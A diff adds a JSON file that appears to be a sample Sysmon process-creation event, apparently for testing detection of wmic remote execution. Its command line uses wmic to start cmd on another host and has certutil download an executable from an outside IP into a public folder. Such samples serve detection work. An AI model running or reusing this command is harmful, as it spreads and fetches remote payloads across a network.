@@ -1,0 +1,13 @@
+{
+  "_comment": "wmic launching a process on a remote host over WMI",
+  "EventID": 1,
+  "UtcTime": "2026-08-11 10:00:00.000",
+  "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+  "CommandLine": "wmic /node:10.20.4.19 process call create \"cmd.exe /c certutil -urlcache -f http://45.61.13.7/a.exe C:\\Users\\Public\\a.exe\"",
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+  "ParentCommandLine": "cmd.exe /c",
+  "CurrentDirectory": "C:\\Users\\Public\\",
+  "User": "CORP\\j.rivera",
+  "ProcessId": 7788,
+  "IntegrityLevel": "High"
+}
